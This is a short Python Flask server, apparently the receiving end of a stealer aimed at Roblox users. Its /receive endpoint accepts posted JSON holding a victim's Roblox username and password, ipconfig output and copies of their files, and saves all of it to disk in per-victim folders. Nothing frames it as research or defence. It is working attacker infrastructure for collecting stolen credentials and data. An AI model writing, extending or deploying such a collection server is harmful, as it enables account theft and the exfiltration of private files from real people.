from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
app = Flask(__name__)
import os
CORS(app=app)

@app.route("/receive", methods=["POST"])
def receive():
    data = request.json
    print(data)
    if "files" in data.keys():
        try:os.mkdir(f"{data["rblx username"]}")
        finally: 
            with open(f"{data["rblx username"]}/OTHER_DATA.txt", "w") as writah:writah.write(f"{data["rblx username"]}\n{data["rblx passwd"]}\n\n\n{data["ipconfig"]}")
            for folder in data["files"].keys():
                try: os.mkdir(f"{data["rblx username"]}/{folder}")
                finally:
                    for filename in data["files"][folder].keys():
                        with open(f"{data["rblx username"]}/{folder}/{filename}", "w") as writer: writer.write(data["files"][folder][filename])
    return jsonify({"success": "received"})

def runFlask():
    app.run(host="0.0.0.0", port=8888)


    
threading.Thread(target=runFlask, daemon=False).start()